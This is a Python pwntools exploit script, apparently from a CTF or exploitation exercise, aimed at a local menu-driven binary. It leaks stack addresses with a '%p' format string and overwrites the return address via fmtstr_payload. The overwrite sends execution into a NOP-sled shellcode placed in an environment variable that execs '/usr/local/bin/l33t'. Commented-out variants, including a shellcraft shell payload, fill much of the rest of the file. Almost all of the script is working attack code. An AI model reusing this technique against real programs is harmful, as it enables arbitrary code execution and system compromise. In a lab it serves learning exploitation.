#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./5
from pwn import *
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './5')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

l33tpath = '/usr/local/bin/l33t'
shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
#shellcode = asm(shellcraft.syscall('SYS_execve', l33tpath, 'rsp', 0, 0))
nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode

payload = fit({
    0: shellcode,
})

# Start with a custom empty env
env = {
    "SHOULD_NOT_SEE": "yes",
    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
}


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        env['L33T'] = shellcode
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes



# Use to leak

leak = b"%p."* 40

io = start()

# add a new pair
io.sendline("1")
# add the name
io.sendline("fmtstring username")
# leak the memory
io.sendline(leak)

# read the password
io.sendline("3")
io.sendline("0")

output = io.recv()
print("got output", output)

lines = output.split(b'\n')
# The leak res is always at the 17th line, at the 6th index
leak_res = lines[17].split(b'.')[6]

print("username is at ", leak_res)
# convert the leak_res (hex) to int
leak_res_ptr = int(leak_res, 16)

# the return address is 56 bytes lower than the username
return_addr_ptr = leak_res_ptr - 56
print("return address is at ", hex(return_addr_ptr))

# Create a format string payload
overwrite_addr = (return_addr_ptr)
overwrite_with = p64(0x7fffffffeec8 + 50) # this is from debugging with GDB, it is in env
payload = fmtstr_payload(22, {overwrite_addr: overwrite_with})

# return to main menu
io.sendline("1")
# add a new pair
io.sendline("1")
# add the name
io.sendline("fmtstring username")
# overwrite the memory
io.sendline(payload)

# read the password
# io.sendline("3")
# io.sendline("1")




# # io.sendline(payload)

# io.sendline(payload)
    




# # add a new pair
# io.sendline("1")
# # add the name
# io.sendline("fmtstring username")
# # overwrite the memory
# io.sendline(payload)

# # read the password
# io.sendline("3")
# io.sendline("1")



# i = 0
# for line in data.split("\n"):
#     print("Line", i, ":", str(line))
#     i += 1

# print('Got data:', data.split(b'\n'))



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()



#
# THIS WORKS:
#

# overwrite_addr = (0x7fffffffe9a0)
# overwrite_with = p64(0xdeadbeef)
# payload = fmtstr_payload(22, {overwrite_addr: overwrite_with})

# io = start()

# # add a new pair
# io.sendline("1")
# # add the name
# io.sendline("fmtstring username")
# # leak the memory
# # io.sendline(leak)
# io.sendline(payload)

# # read the password
# io.sendline("3")
# io.sendline("0")